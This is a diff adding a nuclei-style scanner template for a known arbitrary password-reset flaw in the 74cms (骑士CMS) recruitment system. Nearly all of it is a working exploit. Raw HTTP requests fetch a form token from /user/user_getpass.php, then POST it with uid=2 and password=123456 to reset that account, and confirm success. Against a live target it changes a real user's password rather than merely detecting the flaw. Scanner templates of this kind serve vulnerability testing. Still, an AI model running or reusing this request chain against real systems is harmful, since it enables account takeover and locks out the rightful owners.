@@ -1,0 +1,47 @@
+id: wooyun-2015-0137785
+info:
+  name: 74cms最新版重置任意账号密码
+  author:
+  - jim2g
+  description: |
+    74cms最新版重置任意账号密码
+        骑士CMS人才招聘系统是基于PHP+MYSQL的免费人才招聘系统源码,13年专注部署版源码系统研发.模块化设计,前后端分离,支持后台一键升级更新.
+  severity: medium
+  remediation: |2
+
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://www.74cms.com/download/index.html
+    临时修复方案：
+    根据漏洞具体详细进行漏洞修复方案描写
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200
+    - regex("name=\"token\" value=\"(.*?)\"",body)
+    - status_code_2==302
+    - status_code_3==200
+    - contains(body_3,"icon-success")
+  extractors:
+  - name: token
+    type: regex
+    regex:
+    - name="token" value="(.*?)"
+    group: 1
+    part: body
+    internal: true
+  raw:
+  - |
+    GET /user/user_getpass.php HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    POST /user/user_getpass.php?act=get_pass_save HTTP/1.1
+    Host: {{Hostname}}
+
+    token={{token}}&uid=2&password=123456
+  - |
+    GET /user/user_getpass.php?act=get_pass_sucess HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
